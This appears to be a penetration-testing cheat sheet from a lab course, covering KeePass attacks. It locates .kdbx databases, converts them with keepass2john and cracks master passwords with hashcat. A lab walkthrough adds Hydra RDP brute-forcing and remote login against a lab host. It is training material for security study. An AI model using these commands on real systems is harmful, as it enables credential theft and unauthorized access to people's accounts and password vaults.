# Password Manager

KeePass in installed programs list
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Password-Manager-1.png)

Searching for KeePass database files
>``` shell
>PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
>
># ========== Expected Result ==========
>    Directory: C:\Users\jason\Documents
>
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>-a----         5/30/2022   8:19 AM           1982 Database.kdbx
># =====================================
>```

KeePass database in Explorer
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Password-Manager-2.png)

Using keepass2john to format the KeePass database for Hashcat
>``` shell
>kali@kali:~/passwordattacks$ ls -la Database.kdbx
>
># ========== Expected Result ==========
>-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx
># =====================================
>
>kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash
>
>kali@kali:~/passwordattacks$ cat keepass.hash
>
># ========== Expected Result ==========
>Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
># =====================================
>```

Correct hash format for Hashcat without "Database:"
>``` shell
>kali@kali:~/passwordattacks$ cat keepass.hash
>
># ========== Expected Result ==========
>$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
># =====================================
>```

Finding the mode of KeePass in Hashcat
>``` shell
>kali@kali:~/passwordattacks$ hashcat --help | grep -i "KeePass"
>
># ========== Expected Result ==========
>13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
># =====================================
>```

Cracking the KeePass database hash
>``` shell
>kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
>
># ========== Expected Result ==========
>hashcat (v6.2.5) starting
>...
>$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
>...
># =====================================
>```

Prompt for Master Password in KeePass
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Password-Manager-3.png)

Password list after successful entering the Master Password
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Password-Manager-4.png)

Lab 1 - Follow the steps outlined in this section to obtain the master password of the KeePass database on VM #1 (SALESWK01). Enter the password found with the title "User Company Password".
>``` shell
>
>```
>

Lab 2 - Enumerate VM #2 and get access to the system as user nadine. Obtain the password stored as title "flag" in the password manager and enter it as answer to this exercise. Note that the flag is not formatted as OS{} for this exercise.
>``` shell
># 1) Confirm RDP is running on the target (service/version enumeration on port 3389)
>nmap -p 3389 -sV 192.168.241.227
>
># 2) Brute-force RDP credentials for user "nadine" using rockyou.txt (dictionary attack for GUI access)
>hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.241.227
>
># 3) RDP into VM #2 as nadine using the cracked password from Hydra (example: 123abc)
>xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
>
># 4) (On Windows) Run PowerShell "As Administrator" so you can enumerate installed programs and search the full disk
>
># 5) Enumerate installed applications to confirm KeePass is installed (password manager present)
>Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
>Select DisplayName
>
># 6) Search the entire C:\ drive for KeePass database files (*.kdbx)
>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
>
># 7) (Manual step) Copy the KeePass database from Windows to Kali: C:\Users\nadine\Documents\Database.kdbx
>
># 8) Convert the KeePass database into a crackable hash format (keepass2john output)
>keepass2john Database.kdbx > keepass.hash
>
># 9) Clean the hash so it starts at "$keepass$" (remove the "Database:" prefix and any leading text)
>sed -i 's/^.*\$keepass/\$keepass/' keepass.hash
>
># 10) Verify the cleaned hash format looks correct before cracking
>cat keepass.hash
>
># 11) Confirm the correct Hashcat mode for KeePass (should show mode 13400 for KeePass 1/2)
>hashcat --help | grep -i keepass
>
># 12) Crack the KeePass master password offline using rockyou + rockyou-30000 rules
>hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
>-r /usr/share/hashcat/rules/rockyou-30000.rule
>
># 13) (On Windows) Open KeePass and unlock Database.kdbx using the cracked master password (example: pinkpanther1234)
>
># 14) In KeePass, locate the entry with Title "flag" and copy the PASSWORD field: This value is the answer to the exercise (note: not formatted as OS{}).
>```
>
